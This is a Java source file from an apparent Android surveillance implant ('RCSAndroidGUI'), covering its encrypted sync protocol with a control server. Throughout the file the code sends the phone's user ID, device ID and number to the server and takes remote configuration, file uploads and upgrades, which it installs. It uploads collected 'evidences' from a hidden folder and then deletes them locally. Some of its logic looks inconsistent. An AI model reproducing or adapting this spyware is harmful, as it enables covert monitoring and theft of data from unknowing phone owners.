package com.ht.RCSAndroidGUI.action.sync;

import java.io.EOFException;
import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Date;
import java.util.Vector;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.EvidenceCollector;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.crypto.CryptoException;
import com.ht.RCSAndroidGUI.crypto.Encryption;
import com.ht.RCSAndroidGUI.crypto.EncryptionPKCS5;
import com.ht.RCSAndroidGUI.crypto.Keys;
import com.ht.RCSAndroidGUI.crypto.SHA1Digest;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Directory;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.DataBuffer;
import com.ht.RCSAndroidGUI.utils.Utils;
import com.ht.RCSAndroidGUI.utils.WChar;

public class ZProtocol extends Protocol {

	private static final int SHA1LEN = 20;
	// #ifdef DEBUG
	private static Debug debug = new Debug("ZProtocol");
	// #endif

	private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
	private final EncryptionPKCS5 cryptoConf = new EncryptionPKCS5();

	byte[] Kd = new byte[16];
	byte[] Nonce = new byte[16];

	boolean upgrade;
	Vector upgradeFiles = new Vector();

	public ZProtocol() {
		try {
			random = SecureRandom.getInstance("SHA1PRNG");
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	SecureRandom random;

	public boolean perform() {
		// #ifdef DBC
		Check.requires(transport != null, "perform: transport = null");
		// #endif

		reload = false;
		uninstall = false;

		try {

			uninstall = authentication();

			if (uninstall) {
				// #ifdef DEBUG
				debug.warn("Uninstall detected, no need to continue");
				// #endif
				return true;
			}

			boolean[] capabilities = identification();

			newConf(capabilities[Proto.NEW_CONF]);
			download(capabilities[Proto.DOWNLOAD]);
			upload(capabilities[Proto.UPLOAD]);
			upgrade(capabilities[Proto.UPGRADE]);
			filesystem(capabilities[Proto.FILESYSTEM]);
			evidences();
			end();

			return true;

		} catch (TransportException e) {
			// #ifdef DEBUG
			debug.error(e);
			// #endif
			return false;
		} catch (ProtocolException e) {
			// #ifdef DEBUG
			debug.error(e);
			// #endif
			return false;
		} catch (CommandException e) {
			// #ifdef DEBUG
			debug.error(e);
			// #endif
			return false;
		} finally {
			transport.close();
		}
	}

	private boolean authentication() throws TransportException,
			ProtocolException {
		// #ifdef DEBUG
		debug.info("***** Authentication *****");
		// #endif

		// key init
		cryptoConf.makeKey(Encryption.getKeys().getChallengeKey());

		random.nextBytes(Kd);
		random.nextBytes(Nonce);

		// #ifdef DEBUG
		debug.trace("Kd: " + Utils.byteArrayToHex(Kd));
		debug.trace("Nonce: " + Utils.byteArrayToHex(Nonce));
		// #endif

		byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
		byte[] response = transport.command(cypherOut);
		parseAuthentication(response);
		return false;
	}

	private boolean[] identification() throws TransportException,
			ProtocolException {
		// #ifdef DEBUG
		debug.info("***** Identification *****");
		// #endif

		byte[] response = command(Proto.ID, forgeIdentification());
		boolean[] capabilities = parseIdentification(response);
		return capabilities;
	}

	private void newConf(boolean cap) throws TransportException,
			ProtocolException, CommandException {
		if (cap) {
			// #ifdef DEBUG
			debug.info("***** NewConf *****");
			// #endif

			byte[] response = command(Proto.NEW_CONF);
			parseNewConf(response);
		}
	}

	private void download(boolean cap) throws TransportException,
			ProtocolException, CommandException {
		if (cap) {
			byte[] response = command(Proto.DOWNLOAD);
			parseNewConf(response);
		}
	}

	private void upload(boolean cap) throws TransportException,
			ProtocolException, CommandException {
		if (cap) {
			// #ifdef DEBUG
			debug.info("***** Upload *****");
			// #endif

			upgrade = false;
			boolean left = true;
			while (left) {
				byte[] response = command(Proto.UPLOAD);
				left = parseUpload(response);
			}
		}
	}

	private void upgrade(boolean cap) throws TransportException,
			ProtocolException, CommandException {
		if (cap) {
			// #ifdef DEBUG
			debug.info("***** Upgrade *****");
			// #endif

			upgradeFiles.removeAllElements();

			boolean left = true;
			while (left) {
				byte[] response = command(Proto.UPGRADE);
				left = parseUpgrade(response);
			}
		}
	}

	private void filesystem(boolean cap) throws TransportException,
			ProtocolException, CommandException {
		if (cap) {
			// #ifdef DEBUG
			debug.info("***** FileSystem *****");
			// #endif
			byte[] response = command(Proto.FILESYSTEM);
			parseFileSystem(response);
		}
	}

	private void evidences() throws TransportException, ProtocolException,
			CommandException {
		// #ifdef DEBUG
		debug.info("***** Log *****");
		// #endif

		sendEvidences(Path.hidden());
	}

	private void end() throws TransportException, ProtocolException,
			CommandException {
		// #ifdef DEBUG
		debug.info("***** END *****");
		// #endif
		byte[] response = command(Proto.BYE);
		parseNewConf(response);
	}

	// **************** PROTOCOL **************** //
	protected byte[] forgeAuthentication() {
		Keys keys = Encryption.getKeys();

		byte[] data = new byte[104];
		DataBuffer dataBuffer = new DataBuffer(data, 0, data.length);

		// filling structure
		dataBuffer.write(Kd);
		dataBuffer.write(Nonce);

		// #ifdef DBC
		Check.ensures(dataBuffer.getPosition() == 32,
				"forgeAuthentication, wrong array size");
		// #endif

		dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
		dataBuffer.write(keys.getInstanceId());
		dataBuffer.write(Utils.padByteArray(keys.getSubtype(), 16));

		// #ifdef DBC
		Check.ensures(dataBuffer.getPosition() == 84,
				"forgeAuthentication, wrong array size");
		// #endif

		// calculating digest
		final SHA1Digest digest = new SHA1Digest();
		digest.update(Utils.padByteArray(keys.getBuildId(), 16));
		digest.update(keys.getInstanceId());
		digest.update(Utils.padByteArray(keys.getSubtype(), 16));
		digest.update(keys.getConfKey());

		byte[] sha1 = digest.getDigest();

		// #ifdef DEBUG
		debug.trace("forgeAuthentication sha1 = " + Utils.byteArrayToHex(sha1));
		debug.trace("forgeAuthentication confKey="
				+ Utils.byteArrayToHex(keys.getConfKey()));
		// #endif

		// appending digest
		dataBuffer.write(sha1);

		// #ifdef DBC
		Check.ensures(dataBuffer.getPosition() == data.length,
				"forgeAuthentication, wrong array size");
		// #endif

		// #ifdef DEBUG
		debug.trace("forgeAuthentication: " + Utils.byteArrayToHex(data));
		// #endif

		return data;
	}

	/**
	 * 
	 * @param authResult
	 * @return true if uninstall
	 * @throws ProtocolException
	 */
	protected boolean parseAuthentication(byte[] authResult)
			throws ProtocolException {
		// #ifdef DBC
		Check.ensures(authResult.length == 64, "authResult.length="
				+ authResult.length);
		// #endif

		// #ifdef DEBUG
		debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult));
		// #endif

		// Retrieve K
		byte[] cypherKs = new byte[32];
		Utils.copy(cypherKs, authResult, cypherKs.length);
		try {
			byte[] Ks = cryptoConf.decryptData(cypherKs);

			// #ifdef DEBUG
			debug.trace("decodeAuth Kd=" + Utils.byteArrayToHex(Kd));
			debug.trace("decodeAuth Ks=" + Utils.byteArrayToHex(Ks));
			// #endif

			// PBKDF1 (SHA1, c=1, Salt=KS||Kd)
			final SHA1Digest digest = new SHA1Digest();
			digest.update(Encryption.getKeys().getConfKey());
			digest.update(Ks);
			digest.update(Kd);

			byte[] K = new byte[16];
			Utils.copy(K, digest.getDigest(), K.length);

			cryptoK.makeKey(K);

			// #ifdef DEBUG
			debug.trace("decodeAuth K=" + Utils.byteArrayToHex(K));
			// #endif

			// Retrieve Nonce and Cap
			byte[] cypherNonceCap = new byte[32];
			Utils.copy(cypherNonceCap, 0, authResult, 32, cypherNonceCap.length);

			byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
			// #ifdef DEBUG
			debug.trace("decodeAuth plainNonceCap="
					+ Utils.byteArrayToHex(plainNonceCap));
			// #endif

			boolean nonceOK = Utils.equals(Nonce, 0, plainNonceCap, 0,
					Nonce.length);
			// #ifdef DEBUG
			debug.trace("decodeAuth nonceOK: " + nonceOK);
			// #endif
			if (nonceOK) {
				int cap = Utils.byteArrayToInt(plainNonceCap, 16);
				if (cap == Proto.OK) {
					// #ifdef DEBUG
					debug.trace("decodeAuth Proto OK");
					// #endif
				} else if (cap == Proto.UNINSTALL) {
					// #ifdef DEBUG
					debug.trace("decodeAuth Proto Uninstall");
					// #endif
					return true;
				} else {
					// #ifdef DEBUG
					debug.trace("decodeAuth error: " + cap);
					// #endif
					throw new ProtocolException(11);
				}
			} else {
				throw new ProtocolException(12);
			}

		} catch (CryptoException ex) {
			// #ifdef DEBUG
			debug.error("parseAuthentication: " + ex);
			// #endif
			throw new ProtocolException(13);
		}

		return false;
	}

	protected byte[] forgeIdentification() {
		final Device device = Device.self();

		byte[] userid = WChar.pascalize(device.getWUserId());
		byte[] deviceid = WChar.pascalize(device.getWDeviceId());
		byte[] phone = WChar.pascalize(device.getWPhoneNumber());

		int len = 4 + userid.length + deviceid.length + phone.length;

		byte[] content = new byte[len];

		DataBuffer dataBuffer = new DataBuffer(content, 0, content.length);
		// dataBuffer.writeInt(Proto.ID);
		dataBuffer.write(device.getVersion());
		dataBuffer.write(userid);
		dataBuffer.write(deviceid);
		dataBuffer.write(phone);

		// #ifdef DBC
		Check.ensures(dataBuffer.getPosition() == content.length,
				"forgeIdentification pos: " + dataBuffer.getPosition());
		// #endif

		// #ifdef DEBUG
		debug.trace("forgeIdentification: " + Utils.byteArrayToHex(content));
		// #endif
		return content;
	}

	protected boolean[] parseIdentification(byte[] result)
			throws ProtocolException {
		boolean[] capabilities = new boolean[Proto.LASTTYPE];

		int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			// #ifdef DEBUG
			debug.info("got Identification");
			// #endif

			DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				// la totSize e' discutibile
				int totSize = dataBuffer.readInt();

				long dateServer = dataBuffer.readLong();

				// #ifdef DEBUG
				debug.trace("parseIdentification: " + dateServer);
				// #endif

				Date date = new Date();
				int drift = (int) (dateServer - (date.getTime() / 1000));

				// #ifdef DEBUG
				debug.trace("parseIdentification drift: " + drift);
				// #endif
				Status.self().drift = drift;

				int numElem = dataBuffer.readInt();

				for (int i = 0; i < numElem; i++) {
					int cap = dataBuffer.readInt();
					if (cap < Proto.LASTTYPE) {
						capabilities[cap] = true;
					}
					// #ifdef DEBUG
					debug.trace("capabilities: " + capabilities[i]);
					// #endif
				}

			} catch (IOException e) {
				// #ifdef DEBUG
				debug.error(e);
				// #endif
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.info("no new conf: ");
			// #endif
		} else {
			// #ifdef DEBUG
			debug.error("parseNewConf: " + res);
			// #endif
			throw new ProtocolException();
		}

		return capabilities;
	}

	protected void parseNewConf(byte[] result) throws ProtocolException,
			CommandException {
		int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			// #ifdef DEBUG
			debug.info("got NewConf");
			// #endif

			int confLen = Utils.byteArrayToInt(result, 4);
			// #ifdef DEBUG
			debug.trace("parseNewConf len: " + confLen);
			// #endif

			boolean ret = Protocol.saveNewConf(result, 8);
			if (ret) {
				reload = true;
			}

		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.info("no new conf: ");
			// #endif
		} else {
			// #ifdef DEBUG
			debug.error("parseNewConf: " + res);
			// #endif
			throw new ProtocolException();
		}
	}

	protected void parseDownload(byte[] result) throws ProtocolException {
		int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			// #ifdef DEBUG
			debug.trace("parseDownload, OK");
			// #endif
			DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				// la totSize e' discutibile
				int totSize = dataBuffer.readInt();
				int numElem = dataBuffer.readInt();
				for (int i = 0; i < numElem; i++) {
					String file = WChar.readPascal(dataBuffer);
					// #ifdef DEBUG
					debug.trace("parseDownload: " + file);
					// #endif

					// expanding $dir$
					file = Directory.expandMacro(file);
					file = Protocol.normalizeFilename(file);
					Protocol.saveDownloadLog(file);
				}

			} catch (IOException e) {
				// #ifdef DEBUG
				debug.error(e);
				// #endif
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.info("parseDownload: no download");
			// #endif
		} else {
			// #ifdef DEBUG
			debug.error("parseDownload, wrong answer: " + res);
			// #endif
			throw new ProtocolException();
		}
	}

	/**
	 * @param content
	 * @return true if left>0
	 * @throws ProtocolException
	 */
	protected boolean parseUpload(byte[] result) throws ProtocolException {

		int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			// #ifdef DEBUG
			debug.trace("parseUpload, OK");
			// #endif
			DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				int totSize = dataBuffer.readInt();
				int left = dataBuffer.readInt();
				// #ifdef DEBUG
				debug.trace("parseUpload left: " + left);
				// #endif
				String filename = WChar.readPascal(dataBuffer);
				// #ifdef DEBUG
				debug.trace("parseUpload: " + filename);
				// #endif

				int size = dataBuffer.readInt();
				byte[] content = new byte[size];
				dataBuffer.read(content);

				// #ifdef DEBUG
				debug.trace("parseUpload: saving");
				// #endif
				Protocol.saveUpload(filename, content);

				return left > 0;

			} catch (IOException e) {
				// #ifdef DEBUG
				debug.error(e);
				// #endif
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.trace("parseUpload, NO");
			// #endif
			return false;
		} else {
			// #ifdef DEBUG
			debug.error("parseUpload, wrong answer: " + res);
			// #endif
			throw new ProtocolException();
		}
	}

	protected boolean parseUpgrade(byte[] result) throws ProtocolException {

		int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			// #ifdef DEBUG
			debug.trace("parseUpgrade, OK");
			// #endif
			DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				int totSize = dataBuffer.readInt();
				int left = dataBuffer.readInt();
				// #ifdef DEBUG
				debug.trace("parseUpgrade left: " + left);
				// #endif
				String filename = WChar.readPascal(dataBuffer);
				// #ifdef DEBUG
				debug.trace("parseUpgrade: " + filename);
				// #endif

				int size = dataBuffer.readInt();
				byte[] content = new byte[size];
				dataBuffer.read(content);

				// #ifdef DEBUG
				debug.trace("parseUpgrade: saving");
				// #endif
				Protocol.saveUpload(filename, content);
				upgradeFiles.addElement(filename);

				if (left == 0) {
					// #ifdef DEBUG
					debug.trace("parseUpgrade: all file saved, proceed with upgrade");
					// #endif
					Protocol.upgradeMulti(upgradeFiles);
				}

				return left > 0;

			} catch (IOException e) {
				// #ifdef DEBUG
				debug.error(e);
				// #endif
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.trace("parseUpload, NO");
			// #endif
			return false;
		} else {
			// #ifdef DEBUG
			debug.error("parseUpload, wrong answer: " + res);
			// #endif
			throw new ProtocolException();
		}
	}

	protected void parseFileSystem(byte[] result) throws ProtocolException {
		int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			// #ifdef DEBUG
			debug.trace("parseFileSystem, OK");
			// #endif
			DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				int totSize = dataBuffer.readInt();
				int numElem = dataBuffer.readInt();
				for (int i = 0; i < numElem; i++) {
					int depth = dataBuffer.readInt();
					String file = WChar.readPascal(dataBuffer);
					// #ifdef DEBUG
					debug.trace("parseFileSystem: " + file + " depth: " + depth);
					// #endif

					// expanding $dir$
					file = Directory.expandMacro(file);
					Protocol.saveFilesystem(depth, file);
				}

			} catch (IOException e) {
				// #ifdef DEBUG
				debug.error("parse error: " + e);
				// #endif
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.info("parseFileSystem: no download");
			// #endif
		} else {
			// #ifdef DEBUG
			debug.error("parseFileSystem, wrong answer: " + res);
			// #endif
			throw new ProtocolException();
		}
	}

	protected void sendEvidences(String basePath) throws TransportException,
			ProtocolException {
		// #ifdef DEBUG
		debug.info("sendEvidences from: " + basePath);
		// #endif

		EvidenceCollector logCollector = EvidenceCollector.self();

		final Vector dirs = logCollector.scanForDirLogs(basePath);
		final int dsize = dirs.size();
		// #ifdef DEBUG
		debug.trace("sendEvidences #directories: " + dsize);
		// #endif
		for (int i = 0; i < dsize; ++i) {
			final String dir = (String) dirs.elementAt(i);
			final Vector logs = logCollector.scanForEvidences(basePath, dir);
			final int lsize = logs.size();
			// #ifdef DEBUG
			debug.trace("    dir: " + dir + " #evidences: " + lsize);
			// #endif
			for (int j = 0; j < lsize; ++j) {
				final String logName = (String) logs.elementAt(j);
				final String fullLogName = basePath + dir + logName;
				final AutoFile file = new AutoFile(fullLogName);
				if (!file.exists()) {
					// #ifdef DEBUG
					debug.error("File doesn't exist: " + fullLogName);
					// #endif
					continue;
				}
				final byte[] content = file.read();
				// #ifdef DEBUG
				debug.info("Sending file: "
						+ EvidenceCollector.decryptName(logName) + " = "
						+ fullLogName);
				// #endif

				byte[] plainOut = new byte[content.length + 4];
				Utils.copy(plainOut, 0, Utils.intToByteArray(content.length),
						0, 4);
				Utils.copy(plainOut, 4, content, 0, content.length);

				byte[] response = command(Proto.LOG, plainOut);
				boolean ret = parseLog(response);

				if (ret) {
					logCollector.remove(fullLogName);
				} else {
					// #ifdef DEBUG
					debug.warn("error sending file, bailing out");
					// #endif
					return;
				}
			}
			if (!Path.removeDirectory(basePath + dir)) {
				// #ifdef DEBUG
				debug.warn("Not empty directory");
				// #endif
			}
		}
	}

	protected boolean parseLog(byte[] result) throws ProtocolException {
		return checkOk(result);
	}

	protected void parseEnd(byte[] result) throws ProtocolException {
		checkOk(result);
	}

	// // ****************************** INTERNALS
	// ****************************************** ////
	private byte[] command(int command) throws TransportException,
			ProtocolException {
		// #ifdef DEBUG
		debug.trace("command: " + command);
		// #endif
		return command(command, new byte[0]);
	}

	private byte[] command(int command, byte[] data) throws TransportException {
		// #ifdef DBC
		Check.requires(cryptoK != null, "cypherCommand: cryptoK null");
		Check.requires(data != null, "cypherCommand: data null");
		// #endif

		// #ifdef DEBUG
		debug.trace("command: " + command + " datalen: " + data.length);
		// #endif

		int dataLen = data.length;
		byte[] plainOut = new byte[dataLen + 4];
		Utils.copy(plainOut, 0, Utils.intToByteArray(command), 0, 4);
		Utils.copy(plainOut, 4, data, 0, data.length);

		try {
			byte[] plainIn;
			// #ifdef ZNOSHA
			// plainIn = cypheredWriteRead(plainOut);
			// #else
			plainIn = cypheredWriteReadSha(plainOut);
			// #endif
			return plainIn;
		} catch (CryptoException e) {
			// #ifdef DEBUG
			debug.trace("command: " + e);
			// #endif
			throw new TransportException(9);
		}
	}

	// #ifdef ZNOSHA
	private byte[] cypheredWriteRead(byte[] plainOut)
			throws TransportException, CryptoException {

		debug.trace("cypheredWriteRead");

		byte[] cypherOut = cryptoK.encryptData(plainOut);
		byte[] cypherIn = transport.command(cypherOut);
		byte[] plainIn = cryptoK.decryptData(cypherIn);
		return plainIn;
	}

	// #endif

	private byte[] cypheredWriteReadSha(byte[] plainOut)
			throws TransportException, CryptoException {
		// #ifdef DEBUG
		debug.trace("cypheredWriteReadSha");
		debug.trace("plainout: " + plainOut.length);
		// #endif

		byte[] cypherOut = cryptoK.encryptDataIntegrity(plainOut);
		// #ifdef DEBUG
		debug.trace("cypherOut: " + cypherOut.length);
		// #endif

		byte[] cypherIn = transport.command(cypherOut);

		if (cypherIn.length < SHA1LEN) {
			// #ifdef DEBUG
			debug.error("cypheredWriteReadSha: cypherIn sha len error!");
			// #endif
			throw new CryptoException();
		}

		byte[] plainIn = cryptoK.decryptDataIntegrity(cypherIn);

		return plainIn;

	}

	private boolean checkOk(byte[] result) throws ProtocolException {
		int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			return true;
		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.error("checkOk: NO");
			// #endif
			return false;
		} else {
			// #ifdef DEBUG
			debug.error("checkOk: " + res);
			// #endif

			throw new ProtocolException();
		}
	}
}
